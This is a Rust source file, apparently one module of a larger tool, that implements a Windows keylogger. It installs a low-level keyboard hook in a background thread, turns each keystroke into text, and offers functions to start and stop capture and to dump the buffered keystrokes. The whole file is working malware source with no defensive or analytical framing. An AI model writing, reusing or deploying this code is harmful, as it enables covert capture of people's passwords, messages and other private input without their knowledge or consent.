#![allow(unused_imports, dead_code, non_snake_case)]
/// Kernel-level keyboard hook keylogger.
/// keylog_start() installs WH_KEYBOARD_LL and pumps messages in a background thread.
/// keylog_dump() drains and returns the captured text.
/// keylog_stop() removes the hook and terminates the pump thread.

use std::sync::{Arc, Mutex, OnceLock};
use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};

use windows_sys::Win32::Foundation::{LPARAM, LRESULT, WPARAM};
use windows_sys::Win32::UI::WindowsAndMessaging::{
    CallNextHookEx, GetMessageW, PostThreadMessageW, SetWindowsHookExW,
    UnhookWindowsHookEx, MSG, KBDLLHOOKSTRUCT,
    WH_KEYBOARD_LL, WM_KEYDOWN, WM_SYSKEYDOWN, WM_QUIT,
};
use windows_sys::Win32::UI::Input::KeyboardAndMouse::{
    GetKeyboardState, ToUnicode,
};
use windows_sys::Win32::System::Threading::GetCurrentThreadId;

// ── Module-level statics ──────────────────────────────────────────────────────

static KEYLOG_BUF:       OnceLock<Arc<Mutex<String>>> = OnceLock::new();
static KEYLOG_STOP:      AtomicBool = AtomicBool::new(false);
static KEYLOG_RUNNING:   AtomicBool = AtomicBool::new(false);
static KEYLOG_THREAD_ID: AtomicU32  = AtomicU32::new(0);

static KEYLOG_HOOK: OnceLock<Mutex<Option<isize>>> = OnceLock::new();
fn hook_guard() -> std::sync::MutexGuard<'static, Option<isize>> {
    KEYLOG_HOOK.get_or_init(|| Mutex::new(None)).lock().unwrap()
}

fn buf() -> Arc<Mutex<String>> {
    Arc::clone(KEYLOG_BUF.get_or_init(|| Arc::new(Mutex::new(String::new()))))
}

// ── Low-level keyboard hook callback ─────────────────────────────────────────

unsafe extern "system" fn hook_proc(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    if code >= 0
        && (wparam as u32 == WM_KEYDOWN || wparam as u32 == WM_SYSKEYDOWN)
    {
        let kb = &*(lparam as *const KBDLLHOOKSTRUCT);
        let vk   = kb.vkCode;
        let scan = kb.scanCode;
        let mut state = [0u8; 256];
        GetKeyboardState(state.as_mut_ptr());
        let mut wbuf = [0u16; 16];
        let r = ToUnicode(vk, scan, state.as_ptr(), wbuf.as_mut_ptr(), 16, 0);
        if r > 0 {
            let s = String::from_utf16_lossy(&wbuf[..r as usize]);
            if let Some(arc) = KEYLOG_BUF.get() {
                if let Ok(mut g) = arc.try_lock() {
                    g.push_str(&s);
                }
            }
        } else {
            // Non-printable keys — append a bracketed label
            let label: &str = match vk {
                0x08 => "[BS]",
                0x09 => "[Tab]",
                0x0D => "[Enter]\n",
                0x1B => "[Esc]",
                0x20 => " ",
                0x25 => "[Left]",
                0x26 => "[Up]",
                0x27 => "[Right]",
                0x28 => "[Down]",
                0x2E => "[Del]",
                0x70..=0x87 => "[Fn]",
                _ => "",
            };
            if !label.is_empty() {
                if let Some(arc) = KEYLOG_BUF.get() {
                    if let Ok(mut g) = arc.try_lock() {
                        g.push_str(label);
                    }
                }
            }
        }
    }
    CallNextHookEx(0, code, wparam, lparam)
}

// ── Public API ────────────────────────────────────────────────────────────────

pub fn keylog_start() {
    // Idempotent — only one hook thread at a time
    if KEYLOG_RUNNING.swap(true, Ordering::Relaxed) {
        return;
    }
    KEYLOG_STOP.store(false, Ordering::Relaxed);
    let _arc = buf(); // ensure BUF is initialised before spawning

    std::thread::spawn(|| unsafe {
        let tid = GetCurrentThreadId();
        KEYLOG_THREAD_ID.store(tid, Ordering::Relaxed);

        let hook = SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_proc), 0, 0);
        *hook_guard() = if hook != 0 { Some(hook) } else { None };

        let mut msg: MSG = std::mem::zeroed();
        while !KEYLOG_STOP.load(Ordering::Relaxed)
            && GetMessageW(&mut msg, 0, 0, 0) > 0
        {}

        if let Some(h) = *hook_guard() {
            UnhookWindowsHookEx(h);
        }
        *hook_guard() = None;
        KEYLOG_RUNNING.store(false, Ordering::Relaxed);
        KEYLOG_THREAD_ID.store(0, Ordering::Relaxed);
    });
}

pub fn keylog_stop() {
    KEYLOG_STOP.store(true, Ordering::Relaxed);
    let tid = KEYLOG_THREAD_ID.load(Ordering::Relaxed);
    if tid != 0 {
        unsafe { PostThreadMessageW(tid, WM_QUIT, 0, 0); }
    }
}

/// Drain and return all keystrokes captured so far.
pub fn keylog_dump() -> String {
    KEYLOG_BUF
        .get()
        .map(|arc| {
            let mut g = arc.lock().unwrap();
            let s = g.clone();
            g.clear();
            s
        })
        .unwrap_or_default()
}
